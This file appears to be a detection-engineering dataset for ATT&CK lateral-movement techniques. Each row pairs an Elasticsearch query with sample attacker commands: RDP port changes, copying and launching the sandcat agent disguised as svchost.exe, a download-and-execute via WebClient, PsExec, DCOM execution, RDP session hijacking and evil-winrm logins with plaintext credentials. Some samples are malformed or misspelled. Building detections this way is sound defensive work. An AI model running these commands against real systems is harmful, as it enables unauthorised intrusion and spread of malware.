@@ -1,0 +1,261 @@
+﻿T1021.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Terminal Server\\WinStations\\RDP-Tcp""}},
+                        {""match"": {""CommandLine"": ""TCP""}},
+                       {""match"": {""CommandLine"": ""LocalPort""}}
+                    ]
+     }
+    },
+    {""bool"": {
+                    ""should"":[
+                       {""match_phrase"": {""CommandLine"": ""Set-ItemProperty""}},
+                         {""wildcard"": {""CommandLine"": ""reg*""}},
+                        {""match"": {""CommandLine"": ""add""}}
+                    ]
+                }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 -f 
+&& netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489
+
+Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value 4489; 
+New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489",2
+T1021.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""sandcat.go""}},
+                {""match_phrase"": {""CommandLine"": ""Copy""}},
+                {""wildcard"": {""CommandLine"": ""s4ndc4t*""}}
+               
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$path = ""sandcat.go-windows"";
+$drive = ""\\#{remote.host.fqdn}\C$"";
+Copy-Item -v -Path $path -Destination $drive""\Users\Public\s4ndc4t.exe"";",2
+T1570,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""-ScriptBlock""}},
+                {""match_phrase"": {""CommandLine"": ""System.Management.Automation.PSCredential""}},
+                {""match_phrase"": {""CommandLine"": ""New-PSSession""}},
+                {""match_phrase"": {""CommandLine"": ""-ToSession""}},
+                {""match_phrase"": {""CommandLine"": ""Receive-Job""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$job = Start-Job -ScriptBlock {$username = ""#{domain.user.name}"";
+$password = ""#{domain.user.password}"";
+$secstr = New-Object -TypeName System.Security.SecureString;
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+$session = New-PSSession -ComputerName ""#{remote.host.name}"" -Credential $cred;
+$location = ""#{location}"";
+$exe = ""#{exe_name}"";
+Copy-Item $location -Destination ""C:\Users\Public\svchost.exe"" -ToSession $session;
+Start-Sleep -s 5;
+Remove-PSSession -Session $session;
+};
+Receive-Job -Job $job -Wait;",2
+T1021.006,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Set-Location""}},
+                        {""match_phrase"": {""CommandLine"": ""System.Net.WebClient""}},
+                        {""wildcard"":{""CommandLine"": ""*Headers.add""}},
+                        {""wildcard"":{""CommandLine"": ""*DownloadData""}},
+                        {""match_phrase"":{""CommandLine"": ""sandcat.go""}},
+                        {""wildcard"":{""CommandLine"": ""*ResponseHeaders""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Invoke-Command -ScriptBlock""}},
+                        {""match_phrase"": {""CommandLine"": ""Invoke-WmiMethod -Class Win32_Process""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$server=""#{server}"";
+$sharePath=""#{share}"";
+Set-Location $sharePath;
+$url=""$($server)/file/download"";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(""platform"",""windows"");
+$wc.Headers.add(""file"",""sandcat.go"");
+($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""")) -and ([io.file]::WriteAllBytes(""$($sharePath)$name.exe"",$data));
+$startServer=""$($sharePath)$name.exe -server $($server) "";
+Invoke-Command -ScriptBlock {Param([string]$startServer, $sharePath, $name, $server); 
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""$($sharePath)$name.exe -server $server -v"" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server",2
+T1570,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                   {""match"": {""CommandLine"": ""net""}},
+                  {""match"": {""CommandLine"": ""use""}}, 
+                 {""match"": {""CommandLine"": ""copy""}},               
+                {""wildcard"": {""CommandLine"": ""sandcat*""}},
+                {""match"": {""CommandLine"": ""start""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","net /y use \\#{remote.host.name} 
+& copy /y sandcat.go-windows\\#{remote.host.name}\Users\Public 
+& #{psexec.path} -accepteula \\#{remote.host.name}
+cmd /c start C:\Users\Public\sandcat.go-windows -server #{server} -v",3
+T1021.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""\\\\localhost -accepteula""}},
+                {""wildcard"": {""CommandLine"": ""PsExec*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",C:\PSTools\PsExec.exe \\localhost -accepteula -c C:\Windows\System32\cmd.exe,2
+T1021.006,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Enable-PSRemoting -Force""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",Enable-PSRemoting -Force,2
+T1021.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+     
+                 {""match"": {""CommandLine"": ""hostname""}},   
+                    {""match"": {""CommandLine"": ""&gt""}}   
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1,2
+T1021.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""New-PSDrive""}},
+                 {""match_phrase"": {""CommandLine"": ""-root""}}        
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",New-PSDrive -name g -psprovider filesystem -root \\Target\C$,2
+T1021.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""net use""}}        
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","cmd.exe /c ""net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator""
+
+net use \\#{remote.host.fqdn}\C$ /user:#{domain.user.name} #{domain.user.password}",2(易混淆)
+T1021.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                 {""match_phrase"": {""CommandLine"": ""[type]::GetTypeFromProgID""}},
+                 {""match_phrase"": {""CommandLine"": ""*.Document.ActiveView.ExecuteShellCommand""}}
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\windows\system32\calc.exe"", $null, $null, ""7"")",2
+T1563.002,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""query user""}},
+                {""match"": {""CommandLine"": "" tscon""}},
+                {""match"": {""CommandLine"": ""create""}},
+                 {""match_phrase"": {""CommandLine"": ""net start ""}}        
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","query user 
+&& sc.exe create sesshijack binpath= ""cmd.exe /k tscon 1337 /dest:rdp-tcp#55"" 
+&& net start sesshijack",2
+T1021.001,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match"": {""CommandLine"": ""cmdkey""}},
+               {""match"": {""CommandLine"": ""mstsc""}}        
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","if((Get-CIMInstance -Class Win32_ComputerSystem) { ;
+ } else {Write-Host Joining this computer to a domain must be done manually};  ; 
+ $Server=#{logonserver}; 
+$User = Join-Path; 
+$Password=""#{password}""; 
+cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password;
+mstsc /v:$Server; 
+echo ""RDP connection established""
+
+$Server=""#{logonserver}""; $User=""#{username}""; $Password=""#{password}"";
+cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; 
+mstsc /v:$Server; echo ""RDP connection established""",2
+T1021.006,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""match_phrase"": {""CommandLine"": ""Invoke-Command""}},
+                 {""match_phrase"": {""CommandLine"": ""-scriptblock""}}        
+]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}","$username = ""#{domain.user.name}"";
+$password = ""#{domain.user.password}"";
+$secstr = New-Object -TypeName System.Security.SecureString;
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
+Start-Sleep -s 5;
+Remove-PSSession -Session $session;
+
+invoke-command -ComputerName localhost -scriptblock {ipconfig}",2
+T1021.006,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                {""wildcard"": {""CommandLine"": ""*winrm""}},
+                {""match"": {""CommandLine"": ""Domain""}},
+                  {""match"": {""CommandLine"": ""Administrator ""}}
+           ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
+}",vil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1,2
